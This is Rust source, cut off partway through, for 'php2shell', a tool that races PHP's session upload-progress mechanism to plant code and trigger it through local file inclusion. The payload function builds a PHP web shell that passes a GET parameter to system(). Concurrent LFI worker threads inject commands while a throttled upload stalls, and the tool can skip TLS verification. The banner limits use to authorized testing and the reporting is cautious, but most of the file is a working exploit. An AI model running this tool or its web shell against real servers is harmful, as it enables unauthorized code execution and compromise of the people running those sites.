//! php2shell — HTTP transport + session.upload_progress race primitive.
//!
//! # Cargo.toml (reqwest 0.11 + native-tls backend)
//!
//! ```toml
//! [dependencies]
//! clap        = { version = "4", features = ["derive"] }
//! native-tls  = "0.2"
//! rand        = "0.8"
//! reqwest     = { version = "0.11", default-features = false,
//!                 features = ["blocking", "native-tls"] }
//! serde       = { version = "1", features = ["derive"] }
//! serde_json  = "1"
//! url         = "2"
//! urlencoding = "2"
//! ```
//!
//! # Verdict model
//!
//! The tool reports `UNCONFIRMED` as its ceiling. There is no `CONFIRMED`
//! verdict and no RCE path. See the README table below for the precedence
//! rules `classify()` implements.
//!
//! `UNCONFIRMED` is an honest result when the evidence cannot distinguish
//! execution from reflection. Even non-empty output between markers is not
//! proof by itself.

use std::io::{Read, Write};
use std::net::{IpAddr, TcpStream, ToSocketAddrs};
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use std::{fs, process, thread};

use clap::Parser;
use native_tls::TlsConnector;
use rand::distributions::Alphanumeric;
use rand::Rng;
use reqwest::blocking::{Client as HttpClient, Response as HttpResponse};
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use reqwest::redirect::Policy as RedirectPolicy;
use serde::Serialize;
use url::Url;

const BANNER: &str = "\
+---------------------------------------------+
|  php2shell — session upload progress race   |
|  Reports UNCONFIRMED at most (honest model) |
|  Authorized security testing only           |
+---------------------------------------------+";

const MAX_LFI_BODY: usize = 8 * 1024 * 1024;
const MAX_FP_BODY: usize = 64 * 1024;
const MAX_MARKER_SPAN: usize = 64 * 1024;

/// Ceiling on the raw HTTP response buffer only. Decoded body
/// (`MAX_CHUNKED_BODY`), trailer scratch, and per-probe reqwest allocations
/// are separate and additive. Not a total process-memory limit.
const MAX_RAW_RESPONSE_BUFFER: usize = 16 * 1024 * 1024;
const MAX_CHUNKED_BODY: usize = 1024 * 1024;
const MAX_TRAILER_BYTES: usize = 8 * 1024;
const MAX_TRAILER_COUNT: usize = 64;

const DISABLED_FN_MARKERS: &[&str] = &[
    "has been disabled",
    "has been disabled for security reasons",
    "call to undefined function system",
    "call to undefined function shell_exec",
    "call to undefined function exec",
    "call to undefined function passthru",
];

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser, Debug)]
#[command(
    name = "php2shell",
    version,
    about = "session.upload_progress → LFI race primitive"
)]
struct Cli {
    /// Target base URL (http:// or https://)
    target: String,

    /// Command to run. Default is a language-construct probe (echo is not
    /// affected by disable_functions). Output does NOT imply RCE — see doc.
    #[arg(short = 'c', long, default_value = "echo PHP_TRANSPORT_PROBE_OK")]
    cmd: String,

    /// GET parameter name used in payload and LFI template (%PARAM%)
    #[arg(long, default_value = "c")]
    param: String,

    /// Milliseconds to stall between upload chunks (must exceed
    /// session.upload_progress.min_freq, default 1000 ms).
    #[arg(short = 's', long, default_value = "3000")]
    stall: u64,

    /// Fixed PHPSESSID (default: random per attempt)
    #[arg(long)]
    sid: Option<String>,

    /// PHPSESSID length
    #[arg(long, default_value = "26")]
    sid_length: usize,

    /// PHPSESSID charset: hex (4-bit), 5bit (default), 6bit
    #[arg(long, default_value = "5bit")]
    sid_charset: String,

    /// Session cookie name (PHP `session.name`)
    #[arg(long, default_value = "PHPSESSID")]
    session_name: String,

    /// Multipart field name that triggers session upload progress
    #[arg(long, default_value = "PHP_SESSION_UPLOAD_PROGRESS")]
    progress_field: String,

    /// Path to POST the throttled upload to (default: path from target URL)
    #[arg(long)]
    post_path: Option<String>,

    /// LFI URL template. Supports %SID%, %CMD%, %PARAM%
    #[arg(long)]
    lfi: Option<String>,

    /// Number of concurrent LFI workers used during the stall
    #[arg(long, default_value = "8")]
    lfi_workers: usize,

    /// Delay between LFI attempts per worker (ms)
    #[arg(long, default_value = "100")]
    lfi_interval: u64,

    /// Hard cap on LFI probe attempts across all workers. An attempt that
    /// fails before the request is dispatched still consumes budget — this
    /// is an attempt cap, not a strict wire-request cap.
    #[arg(long, default_value = "5000")]
    lfi_max_attempts: usize,

    /// Number of full end-to-end attempts (fresh SID unless --sid is set)
    #[arg(long, default_value = "1")]
    retries: usize,

    /// Custom User-Agent
    #[arg(short = 'A', long)]
    user_agent: Option<String>,

    /// Extra cookies (session cookie is managed automatically)
    #[arg(long)]
    cookie: Option<String>,

    /// Extra header, repeatable, "Name: Value". Cookie: merges into --cookie.
    #[arg(long = "header", value_name = "K: V")]
    headers: Vec<String>,

    /// Proxy for all requests (http://host:port; socks5 works for LFI only)
    #[arg(long)]
    proxy: Option<String>,

    /// Per-request timeout (seconds)
    #[arg(long, default_value = "15")]
    timeout: u64,

    /// Explicit TLS SNI hostname. Required when the target is an IP with a
    /// named vhost.
    #[arg(long)]
    sni: Option<String>,

    /// Disable hostname verification ONLY; keep chain verification.
    /// Backend-dependent — see module doc.
    #[arg(long)]
    no_verify_hostname: bool,

    /// Skip ALL TLS verification (chain + hostname). Unsafe outside labs.
    #[arg(short = 'k', long)]
    insecure: bool,

    /// Build requests and print them; do not send
    #[arg(long)]
    dry_run: bool,

    /// Skip PHP fingerprinting
    #[arg(long)]
    skip_fingerprint: bool,

    /// Verbose output
    #[arg(short = 'v', long)]
    verbose: bool,

    /// Write JSON report to FILE
    #[arg(short = 'o', long)]
    output: Option<String>,
}

// ============================================================================
// Config
// ============================================================================

#[derive(Clone)]
struct Config {
    target: String,
    host: String,
    port: u16,
    https: bool,
    post_path: String,
    user_agent: String,
    stall: Duration,
    timeout: Duration,
    progress_field: String,
    cmd: String,
    param: String,
    sid: String,
    sid_explicit: bool,
    sid_charset: SidCharset,
    session_name: String,
    insecure: bool,
    no_verify_hostname: bool,
    sni: Option<String>,
    verbose: bool,
    dry_run: bool,
    lfi_template: Option<String>,
    lfi_workers: usize,
    lfi_interval: Duration,
    lfi_max_attempts: usize,
    cookie: Option<String>,
    headers: Vec<String>,
    proxy: Option<String>,
    output_json: Option<String>,
    skip_fingerprint: bool,
    marker: String,
    retries: usize,
}

#[derive(Clone, Copy, Debug)]
enum SidCharset {
    Hex,
    Default5,
    SixBit,
}

impl SidCharset {
    fn chars(self) -> &'static [u8] {
        match self {
            SidCharset::Hex => b"0123456789abcdef",
            SidCharset::Default5 => b"0123456789abcdefghijklmnopqrstuv",
            SidCharset::SixBit => {
                b"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,-"
            }
        }
    }
    fn parse(s: &str) -> Result<Self, String> {
        match s.to_lowercase().as_str() {
            "hex" | "4" | "4bit" => Ok(Self::Hex),
            "5" | "5bit" | "default" => Ok(Self::Default5),
            "6" | "6bit" => Ok(Self::SixBit),
            other => Err(format!("unknown --sid-charset '{}' (hex|5bit|6bit)", other)),
        }
    }
    fn as_str(self) -> &'static str {
        match self {
            Self::Hex => "hex",
            Self::Default5 => "5bit",
            Self::SixBit => "6bit",
        }
    }
}

// ============================================================================
// Verdict — deterministic, no CONFIRMED
// ============================================================================

#[derive(Serialize, Clone, Copy, Debug, PartialEq, Eq)]
#[serde(rename_all = "SCREAMING_SNAKE_CASE")]
enum Verdict {
    /// DNS, TLS, connection, or timeout — no reliable conclusion
    Unknown,
    /// Ordinary HTTP error (5xx, or 3xx that is not a recognized login gate)
    HttpError,
    /// 401, or 3xx whose Location matches the login-gate rule
    AuthRequired,
    /// 429, or a response carrying an exhausted rate-limit header
    /// (`X-RateLimit-Remaining: 0` or equivalent). Deliberately does **not**
    /// fire on `Retry-After` alone, which is also sent for maintenance,
    /// overload, and gateway backoff.
    RateLimited,
    /// LFI probes ran and did not demonstrate inclusion
    NoLfi,
    /// Response received, but nothing was independently established
    Unconfirmed,
    /// Dry-run: nothing sent
    DryRun,
}

// ============================================================================
// Report
// ============================================================================

#[derive(Serialize)]
struct Report {
    target: String,
    verdict: Verdict,
    attempts: usize,

    /// `Some(true)` — positive PHP signal observed.
    /// `Some(false)` — checked, no positive signal observed. **Absence is not
    /// evidence that PHP is absent** — the target may simply not advertise it.
    /// `None` — fingerprinting skipped or could not be attempted.
    php_signal_detected: Option<bool>,
    php_version: Option<String>,

    sid: String,
    sid_charset: String,
    session_name: String,
    stall_ms: u64,
    command: String,
    param: String,
    payload: String,
    lfi_template: Option<String>,
    race_http_status: Option<u16>,

    /// `Retry-After` value seen on the race response, if any. Reported
    /// independently; does **not** change the verdict.
    retry_after: Option<String>,

    race_note: String,

    /// Probe attempts, not confirmed wire requests. An attempt that fails
    /// before dispatch still consumes budget.
    lfi_attempts: usize,
    lfi_hits: usize,

    /// Both markers appeared in the response body. Does **not** establish
    /// execution — reflection can produce an identical byte pattern.
    marker_pair_detected: bool,

    /// Whatever appeared between the two markers. NOT proof of execution.
    marker_output: Option<String>,

    /// Independent evidence (callback, OOB DNS, or a server-computed value
    /// the client cannot produce itself) establishes command execution.
    /// This build has no such primitive; the field is `false` on every path.
    /// Do NOT promote `marker_pair_detected` to `true` here without adding
    /// the corresponding evidence collection.
    execution_confirmed: bool,

    /// A PHP "has been disabled" warning appeared between the markers.
    /// Still UNCONFIRMED (the call was blocked, not executed).
    disabled_function_suspected: bool,

    notes: Vec<String>,
    error: Option<String>,
    timestamp: u64,
}

struct ReportInput {
    attempts: usize,
    verdict: Verdict,
    php_signal_detected: Option<bool>,
    php_version: Option<String>,
    race_status: Option<u16>,
    retry_after: Option<String>,
    race_note: String,
    notes: Vec<String>,
    lfi_attempts: usize,
    marker_pair_detected: bool,
    marker_output: Option<String>,
    disabled_function_suspected: bool,
    error: Option<String>,
}

// ============================================================================
// Raw HTTP response
// ============================================================================

#[derive(Default, Clone)]
struct RawResponse {
    status: Option<u16>,
    body: Vec<u8>,
    set_cookie: Vec<String>,
    location: Option<String>,
    retry_after: Option<String>,
    rate_limit_signal: Option<String>,
    transport_error: Option<String>,
    timed_out: bool,
}

impl RawResponse {
    fn is_2xx(&self) -> bool {
        matches!(self.status, Some(s) if (200..300).contains(&s))
    }
    fn is_3xx(&self) -> bool {
        matches!(self.status, Some(s) if (300..400).contains(&s))
    }
    fn is_5xx(&self) -> bool {
        matches!(self.status, Some(s) if (500..600).contains(&s))
    }
}

#[derive(Debug)]
enum ChunkedState {
    Complete(Vec<u8>),
    Incomplete,
    Malformed(String),
}

struct LfiHit {
    output: String,
    disabled: bool,
}

trait ReadWrite: Read + Write {}
impl<T: Read + Write> ReadWrite for T {}

// ============================================================================
// main
// ============================================================================

fn main() {
    let cli = Cli::parse();
    eprintln!("{}", BANNER);

    if cli.no_verify_hostname && !cli.insecure {
        eprintln!(
            "[warn] --no-verify-hostname: some TLS backends disable ALL \
             verification for this mode. Verify with `cargo tree -i native-tls`."
        );
    }
    if cli.target.starts_with("https://") && cli.sni.is_none() {
        if let Ok(u) = Url::parse(&cli.target) {
            if let Some(h) = u.host_str() {
                if h.parse::<IpAddr>().is_ok() {
                    eprintln!(
                        "[warn] HTTPS target is a bare IP; --sni <hostname> may be required."
                    );
                }
            }
        }
    }

    let cfg = match build_config(cli) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[!] {}", e);
            process::exit(2);
        }
    };

    let report = run(&cfg);
    print_verdict(&report);

    if let Some(path) = &cfg.output_json {
        match serde_json::to_string_pretty(&report) {
            Ok(json) => {
                if let Err(e) = fs::write(path, json) {
                    eprintln!("[!] write {}: {}", path, e);
                } else {
                    eprintln!("[*] JSON report → {}", path);
                }
            }
            Err(e) => eprintln!("[!] serialize report: {}", e),
        }
    }

    if matches!(report.verdict, Verdict::Unknown | Verdict::HttpError) {
        process::exit(1);
    }
}

fn print_verdict(r: &Report) {
    println!();
    println!("==============================================");
    println!("  VERDICT:      {:?}", r.verdict);
    println!("  Target:       {}", r.target);
    println!("  SID:          {}", r.sid);
    println!("  Attempts:     {}", r.attempts);
    if let Some(v) = &r.php_version {
        println!("  PHP version:  {}", v);
    }
    if let Some(out) = &r.marker_output {
        println!("  Marker output (UNVERIFIED): {}", out.trim_end());
    }
    if r.disabled_function_suspected {
        println!("  NOTE:         disabled-function warning appeared between markers");
    }
    if let Some(err) = &r.error {
        println!("  Error:        {}", err);
    }
    for n in &r.notes {
        println!("  Note:         {}", n);
    }
    println!("==============================================");
}

// ============================================================================
// Orchestration
// ============================================================================

fn run(cfg: &Config) -> Report {
    let mut working = cfg.clone();
    if !working.sid_explicit {
        if let Some(sid) = obtain_server_sid(&working) {
            working.sid = sid;
            if working.verbose {
                eprintln!(
                    "[*] strict mode detected — using server-issued SID {}",
                    working.sid
                );
            }
        }
    }

    let mut attempts = 0usize;
    let mut last: Option<Report> = None;

    for _ in 0..cfg.retries.max(1) {
        attempts += 1;
        // working.sid is either --sid or the server-issued SID; preserved
        // across retries so strict-mode sessions keep working.
        let attempt_cfg = working.clone();
        if attempt_cfg.verbose && attempts > 1 {
            eprintln!(
                "[*] retry {}/{} — SID {}",
                attempts, cfg.retries, attempt_cfg.sid
            );
        }

        let report = attempt_once(&attempt_cfg, attempts);
        if report.verdict != Verdict::Unknown && report.verdict != Verdict::HttpError {
            return report;
        }
        last = Some(report);
    }

    last.unwrap_or_else(|| error_report(cfg, attempts, "no attempts executed".into()))
}

fn obtain_server_sid(cfg: &Config) -> Option<String> {
    let client = http_client(cfg, false).ok()?;
    let probe = client
        .post(&cfg.target)
        .form(&[(cfg.progress_field.clone(), "warmup".to_string())])
        .send()
        .ok()?;
    let name_prefix = format!("{}=", cfg.session_name);
    for cookie in probe.headers().get_all("set-cookie") {
        let Ok(s) = cookie.to_str() else { continue };
        for part in s.split(';') {
            let kv = part.trim();
            if let Some(v) = kv.strip_prefix(&name_prefix) {
                let v = v.trim();
                if !v.is_empty() && v != cfg.sid {
                    return Some(v.to_string());
                }
            }
        }
    }
    None
}

fn attempt_once(cfg: &Config, attempt: usize) -> Report {
    let mut notes = Vec::new();

    let (php_signal_detected, php_version) = if cfg.skip_fingerprint {
        notes.push("Fingerprinting skipped (--skip-fingerprint)".into());
        (None, None)
    } else {
        match fingerprint(cfg) {
            Ok(Some(v)) => (Some(true), Some(v)),
            Ok(None) => {
                notes.push(
                    "no positive PHP signal — proceeding anyway (absence is not evidence)".into(),
                );
                (Some(false), None)
            }
            Err(e) => {
                notes.push(format!("fingerprint failed (proceeding): {}", e));
                (None, None)
            }
        }
    };

    let payload = build_payload(cfg);

    if cfg.stall < Duration::from_millis(1000) {
        notes.push(format!(
            "stall {} ms < session.upload_progress.min_freq (default 1000 ms); \
             progress file may never be written",
            cfg.stall.as_millis()
        ));
    }

    match &cfg.lfi_template {
        None => notes
            .push("no --lfi template; race can be observed but inclusion cannot be probed".into()),
        Some(tpl) => {
            if !tpl.contains("%SID%") {
                notes.push("--lfi has no %SID% — poisoning not reachable".into());
            }
            if !tpl.contains("%CMD%") {
                notes.push("--lfi has no %CMD% — no command injected".into());
            }
        }
    }

    let race_req = build_race_request(cfg, &payload);

    if cfg.verbose {
        eprintln!(
            "[*] race: POST {} ({} bytes total, stall {:?})",
            cfg.post_path, race_req.total_len, cfg.stall
        );
    }

    if cfg.dry_run {
        eprintln!("[dry-run] === request line + headers ===");
        eprintln!("{}", String::from_utf8_lossy(&race_req.header_bytes));
        eprintln!(
            "[dry-run] === part1 ({} bytes), sleep {:?} ===",
            race_req.part1_bytes.len(),
            cfg.stall
        );
        eprintln!(
            "[dry-run] === part2 ({} bytes) ===",
            race_req.part2_bytes.len()
        );
        if let Some(tpl) = &cfg.lfi_template {
            eprintln!("[dry-run] LFI URL: {}", build_lfi_url(cfg, tpl));
        }
        return build_report(
            cfg,
            ReportInput {
                attempts: attempt,
                verdict: Verdict::DryRun,
                php_signal_detected,
                php_version,
                race_status: None,
                retry_after: None,
                race_note: "dry-run".into(),
                notes,
                lfi_attempts: 0,
                marker_pair_detected: false,
                marker_output: None,
                disabled_function_suspected: false,
                error: None,
            },
        );
    }

    let (race, hits, lfi_attempts) = race_with_lfi(cfg, &race_req);

    if sid_was_regenerated(cfg, &race) {
        notes.push(
            "Set-Cookie contains a different SID — strict mode is likely on. \
             Retry with --sid from a legitimate session, or the exploit will \
             target a file the server never writes."
                .into(),
        );
    }

    if cfg.verbose {
        eprintln!(
            "[*] race status={:?} timeout={} transport_err={:?}",
            race.status, race.timed_out, race.transport_error
        );
        eprintln!(
            "[*] LFI: {} attempt(s), {} hit(s)",
            lfi_attempts,
            hits.len()
        );
    }

    let (verdict, race_note, more_notes) = classify(cfg, &race, &hits, lfi_attempts);
    notes.extend(more_notes);

    let (marker_pair_detected, marker_output, disabled_suspected) = if let Some(h) = hits.first() {
        (true, Some(h.output.clone()), h.disabled)
    } else {
        (false, None, false)
    };

    build_report(
        cfg,
        ReportInput {
            attempts: attempt,
            verdict,
            php_signal_detected,
            php_version,
            race_status: race.status,
            retry_after: race.retry_after.clone(),
            race_note,
            notes,
            lfi_attempts,
            marker_pair_detected,
            marker_output,
            disabled_function_suspected: disabled_suspected,
            error: None,
        },
    )
}

fn build_report(cfg: &Config, input: ReportInput) -> Report {
    Report {
        target: cfg.target.clone(),
        verdict: input.verdict,
        attempts: input.attempts,
        php_signal_detected: input.php_signal_detected,
        php_version: input.php_version,
        sid: cfg.sid.clone(),
        sid_charset: cfg.sid_charset.as_str().to_string(),
        session_name: cfg.session_name.clone(),
        stall_ms: cfg.stall.as_millis() as u64,
        command: cfg.cmd.clone(),
        param: cfg.param.clone(),
        payload: build_payload(cfg),
        lfi_template: cfg.lfi_template.clone(),
        race_http_status: input.race_status,
        retry_after: input.retry_after,
        race_note: input.race_note,
        lfi_attempts: input.lfi_attempts,
        lfi_hits: if input.marker_pair_detected { 1 } else { 0 },
        marker_pair_detected: input.marker_pair_detected,
        marker_output: input.marker_output,
        execution_confirmed: false,
        disabled_function_suspected: input.disabled_function_suspected,
        notes: input.notes,
        error: input.error,
        timestamp: SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0),
    }
}

fn error_report(cfg: &Config, attempts: usize, err: String) -> Report {
    build_report(
        cfg,
        ReportInput {
            attempts,
            verdict: Verdict::Unknown,
            php_signal_detected: None,
            php_version: None,
            race_status: None,
            retry_after: None,
            race_note: format!("fatal: {}", err),
            notes: Vec::new(),
            lfi_attempts: 0,
            marker_pair_detected: false,
            marker_output: None,
            disabled_function_suspected: false,
            error: Some(err),
        },
    )
}

// ============================================================================
// Payload
// ============================================================================

fn build_payload(cfg: &Config) -> String {
    format!(
        r#"<?php error_reporting(E_ALL);ini_set('display_errors','1');$m="{}";echo $m;system($_GET['{}']);echo $m;?>"#,
        cfg.marker, cfg.param
    )
}

// ============================================================================
// Fingerprinting
// ============================================================================

/// Returns `Ok(Some(version))` on positive evidence, `Ok(None)` when the
/// target was checked and produced no positive signal (absence is **not**
/// evidence), and `Err(_)` when the check could not be attempted.
fn fingerprint(cfg: &Config) -> Result<Option<String>, String> {
    let mut version: Option<String> = None;

    if cfg.verbose {
        eprintln!("[*] fingerprinting {}", cfg.target);
    }

    let client = http_client(cfg, true)?;

    if let Ok(resp) = client.get(&cfg.target).send() {
        if let Some(xpb) = resp.headers().get("x-powered-by") {
            let v = xpb.to_str().unwrap_or("").to_lowercase();
            if v.contains("php") {
                if let Some(rest) = v.split("php/").nth(1) {
                    version = Some(rest.split_whitespace().next().unwrap_or("").to_string());
                } else {
                    version = Some("unknown".into());
                }
            }
        }
        if let Some(srv) = resp.headers().get("server") {
            if srv.to_str().unwrap_or("").to_lowercase().contains("php") && version.is_none() {
                version = Some("unknown".into());
            }
        }
        let cookie_prefix = format!("{}=", cfg.session_name.to_lowercase());
        if resp.headers().get_all("set-cookie").iter().any(|v| {
            let s = v.to_str().unwrap_or("");
            s.to_lowercase().contains(&cookie_prefix) && is_php_sid(cfg, s)
        }) && version.is_none()
        {
            version = Some("unknown".into());
        }
    }

    if version.is_none() {
        let probe = format!("{}/index.php", cfg.target.trim_end_matches('/'));
        if let Ok(mut resp) = client.get(&probe).send() {
            let mut body = Vec::new();
            let mut chunk = [0u8; 4096];
            while body.len() < MAX_FP_BODY {
                match resp.read(&mut chunk) {
                    Ok(0) => break,
                    Ok(n) => body.extend_from_slice(&chunk[..n]),
                    Err(_) => break,
                }
            }
            let text = String::from_utf8_lossy(&body).to_lowercase();
            if text.contains("x-powered-by: php")
                || text.contains("php warning")
                || text.contains("php error")
                || text.contains("php fatal error")
            {
                version = Some("unknown".into());
            }
        }
    }

    Ok(version)
}

fn is_php_sid(cfg: &Config, set_cookie: &str) -> bool {
    let prefix = format!("{}=", cfg.session_name);
    for part in set_cookie.split(';') {
        let t = part.trim();
        if !t.to_lowercase().starts_with(&prefix.to_lowercase()) {
            continue;
        }
        let v = &t[prefix.len()..];
        if v.len() >= 22
            && v.len() <= 48
            && v.bytes()
                .all(|b| b.is_ascii_alphanumeric() || b == b',' || b == b'-')
        {
            return true;
        }
    }
    false
}

// ============================================================================
// HTTP client builder
// ============================================================================

fn http_client(cfg: &Config, follow_redirects: bool) -> Result<HttpClient, String> {
    let mut headers = HeaderMap::new();
    for h in &cfg.headers {
        let (k, v) = h
            .split_once(':')
            .ok_or_else(|| format!("--header '{}' must be 'Name: Value'", h))?;
        let name = HeaderName::from_bytes(k.trim().as_bytes())
            .map_err(|e| format!("bad header name '{}': {}", k, e))?;
        let value = HeaderValue::from_str(v.trim())
            .map_err(|e| format!("bad header value for '{}': {}", k, e))?;
        headers.insert(name, value);
    }

    let mut b = HttpClient::builder()
        .timeout(cfg.timeout)
        .user_agent(&cfg.user_agent)
        .default_headers(headers)
        .redirect(if follow_redirects {
            RedirectPolicy::limited(3)
        } else {
            RedirectPolicy::none()
        });

    if cfg.insecure {
        b = b
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true);
    } else if cfg.no_verify_hostname {
        b = b.danger_accept_invalid_hostnames(true);
    }

    if let Some(p) = &cfg.proxy {
        b = b.proxy(reqwest::Proxy::all(p).map_err(|e| format!("bad proxy: {}", e))?);
    }

    b.build().map_err(|e| e.to_string())
}

// ============================================================================
// Host header helper (IPv6-safe, omits default ports)
// ============================================================================

fn host_header(host: &str, port: u16, https: bool) -> String {
    let default_port = (https && port == 443) || (!https && port == 80);
    let h = if host.contains(':') && !host.starts_with('[') {
        format!("[{}]", host)
    } else {
        host.to_string()
    };
    if default_port {
        h
    } else {
        format!("{}:{}", h, port)
    }
}

// ============================================================================
// Race request construction
// ============================================================================

struct RaceRequest {
    header_bytes: Vec<u8>,
    part1_bytes: Vec<u8>,
    part2_bytes: Vec<u8>,
    total_len: usize,
}

fn build_race_request(cfg: &Config, payload: &str) -> RaceRequest {
    let boundary = format!("----WebKitFormBoundary{}", random_alnum(16));
    let filename = format!("{}.txt", random_alnum(8));

    let chunk1 = vec![b'A'; 1024];
    let chunk2 = vec![b'B'; 1024];

    let prefix = format!(
        "--{b}\r\n\
         Content-Disposition: form-data; name=\"{pf}\"\r\n\r\n\
         {pv}\r\n\
         --{b}\r\n\
         Content-Disposition: form-data; name=\"file\"; filename=\"{fn}\"\r\n\
         Content-Type: text/plain\r\n\r\n",
        b = boundary, pf = cfg.progress_field, pv = payload, fn = filename,
    )
    .into_bytes();
    let suffix = format!("\r\n--{}--\r\n", boundary).into_bytes();

    let mut part1 = prefix;
    part1.extend_from_slice(&chunk1);
    let mut part2 = chunk2;
    part2.extend_from_slice(&suffix);
    let total_len = part1.len() + part2.len();
    let cookie = build_cookie_header(cfg);
    let hostport = host_header(&cfg.host, cfg.port, cfg.https);

    let mut header_bytes = format!(
        "POST {path} HTTP/1.1\r\n\
         Host: {hp}\r\n\
         User-Agent: {ua}\r\n\
         Accept: */*\r\n\
         Content-Type: multipart/form-data; boundary={b}\r\n\
         Content-Length: {cl}\r\n\
         Cookie: {ck}\r\n\
         Connection: close\r\n",
        path = cfg.post_path,
        hp = hostport,
        ua = cfg.user_agent,
        b = boundary,
        cl = total_len,
        ck = cookie,
    )
    .into_bytes();

    for h in &cfg.headers {
        header_bytes.extend_from_slice(h.trim().as_bytes());
        header_bytes.extend_from_slice(b"\r\n");
    }
    header_bytes.extend_from_slice(b"\r\n");

    RaceRequest {
        header_bytes,
        part1_bytes: part1,
        part2_bytes: part2,
        total_len,
    }
}

fn build_cookie_header(cfg: &Config) -> String {
    let mut parts: Vec<String> = Vec::new();
    if let Some(c) = &cfg.cookie {
        for p in c.split(';') {
            let p = p.trim();
            if p.is_empty() {
                continue;
            }
            if p.to_lowercase()
                .starts_with(&format!("{}=", cfg.session_name.to_lowercase()))
            {
                continue;
            }
            parts.push(p.to_string());
        }
    }
    parts.push(format!("{}={}", cfg.session_name, cfg.sid));
    parts.join("; ")
}

// ============================================================================
// Race + concurrent LFI
// ============================================================================

fn race_with_lfi(cfg: &Config, req: &RaceRequest) -> (RawResponse, Vec<LfiHit>, usize) {
    let stop = Arc::new(AtomicBool::new(false));
    let found = Arc::new(AtomicBool::new(false));
    let attempts = Arc::new(AtomicUsize::new(0));
    let max_attempts = cfg.lfi_max_attempts;

    let mut workers = Vec::new();
    if let Some(tpl) = cfg.lfi_template.clone() {
        for i in 0..cfg.lfi_workers.max(1) {
            let cfg = cfg.clone();
            let stop = stop.clone();
            let found = found.clone();
            let attempts = attempts.clone();
            let tpl = tpl.clone();
            workers.push(thread::spawn(move || -> Option<LfiHit> {
                let client = match http_client(&cfg, false) {
                    Ok(c) => c,
                    Err(e) => {
                        eprintln!("[!] LFI worker {}: {}", i, e);
                        return None;
                    }
                };
                let url = build_lfi_url(&cfg, &tpl);
                let mut first_logged = false;
                while !stop.load(Ordering::Relaxed) && !found.load(Ordering::Relaxed) {
                    if !try_reserve(&attempts, max_attempts) {
                        break;
                    }
                    match lfi_probe(&cfg, &client, &url, &mut first_logged, i) {
                        Ok(Some(hit)) => {
                            found.store(true, Ordering::Relaxed);
                            return Some(hit);
                        }
                        Ok(None) => {}
                        Err(e) => {
                            if cfg.verbose {
                                eprintln!("[!] LFI worker {}: {}", i, e);
                            }
                        }
                    }
                    thread::sleep(cfg.lfi_interval);
                }
                None
            }));
        }
    }

    let race = match send_throttled_upload(cfg, req) {
        Ok(r) => r,
        Err(e) => RawResponse {
            transport_error: Some(e),
            ..Default::default()
        },
    };

    stop.store(true, Ordering::Relaxed);
    let mut hits = Vec::new();
    for w in workers {
        match w.join() {
            Ok(Some(h)) => hits.push(h),
            Ok(None) => {}
            Err(e) => eprintln!("[!] worker panicked: {:?}", e),
        }
    }
    let lfi_attempts = attempts.load(Ordering::Relaxed);
    (race, hits, lfi_attempts)
}

fn send_throttled_upload(cfg: &Config, req: &RaceRequest) -> Result<RawResponse, String> {
    let mut conn = open_connection(cfg)?;
    conn.write_all(&req.header_bytes)
        .map_err(|e| format!("write headers: {}", e))?;
    conn.write_all(&req.part1_bytes)
        .map_err(|e| format!("write part1: {}", e))?;
    conn.flush().map_err(|e| format!("flush part1: {}", e))?;
    if cfg.verbose {
        eprintln!(
            "[*] sent {} bytes; stalling {:?}",
            req.header_bytes.len() + req.part1_bytes.len(),
            cfg.stall
        );
    }
    thread::sleep(cfg.stall);
    conn.write_all(&req.part2_bytes)
        .map_err(|e| format!("write part2: {}", e))?;
    conn.flush().map_err(|e| format!("flush part2: {}", e))?;
    read_raw_response(cfg, &mut *conn)
}

// ============================================================================
// Connection setup
// ============================================================================

fn open_connection(cfg: &Config) -> Result<Box<dyn ReadWrite>, String> {
    let tcp = open_tcp(cfg)?;
    if !cfg.https {
        return Ok(Box::new(tcp));
    }

    let mut b = TlsConnector::builder();
    if cfg.insecure {
        b.danger_accept_invalid_certs(true);
        b.danger_accept_invalid_hostnames(true);
    } else if cfg.no_verify_hostname {
        b.danger_accept_invalid_hostnames(true);
    }
    let tls = b
        .build()
        .map_err(|e| format!("TLS build: {}", e))?
        .connect(cfg.sni.as_deref().unwrap_or(&cfg.host), tcp)
        .map_err(|e| format!("TLS handshake: {}", e))?;
    tls.get_ref().set_nodelay(true).ok();
    Ok(Box::new(tls))
}

fn open_tcp(cfg: &Config) -> Result<TcpStream, String> {
    if let Some(proxy) = &cfg.proxy {
        return open_tcp_via_proxy(cfg, proxy);
    }
    let addrs: Vec<_> = (cfg.host.as_str(), cfg.port)
        .to_socket_addrs()
        .map_err(|e| format!("resolve {}:{}: {}", cfg.host, cfg.port, e))?
        .collect();
    let mut last_err = "no addresses resolved".to_string();
    for a in &addrs {
        match TcpStream::connect(a) {
            Ok(s) => {
                s.set_nodelay(true).ok();
                s.set_read_timeout(Some(cfg.timeout)).ok();
                s.set_write_timeout(Some(cfg.timeout)).ok();
                return Ok(s);
            }
            Err(e) => last_err = e.to_string(),
        }
    }
    Err(format!("connect {}:{}: {}", cfg.host, cfg.port, last_err))
}

fn open_tcp_via_proxy(cfg: &Config, proxy: &str) -> Result<TcpStream, String> {
    let url = Url::parse(proxy).map_err(|e| format!("parse proxy '{}': {}", proxy, e))?;
    if url.scheme() != "http" {
        return Err(format!(
            "raw race socket only supports http:// proxies (got '{}'); \
             socks5 works for LFI only (reqwest `socks` feature)",
            url.scheme()
        ));
    }
    let ph = url.host_str().ok_or("proxy URL missing host")?;
    let pp = url.port().unwrap_or(8080);
    let mut s = TcpStream::connect((ph, pp)).map_err(|e| format!("proxy connect: {}", e))?;
    s.set_nodelay(true).ok();
    s.set_read_timeout(Some(cfg.timeout)).ok();
    s.set_write_timeout(Some(cfg.timeout)).ok();

    let target = host_header(&cfg.host, cfg.port, cfg.https);
    let connect = format!("CONNECT {t} HTTP/1.1\r\nHost: {t}\r\n\r\n", t = target);
    s.write_all(connect.as_bytes()).map_err(|e| e.to_string())?;

    let mut buf = Vec::new();
    let mut tmp = [0u8; 1024];
    loop {
        let n = s.read(&mut tmp).map_err(|e| format!("proxy read: {}", e))?;
        if n == 0 {
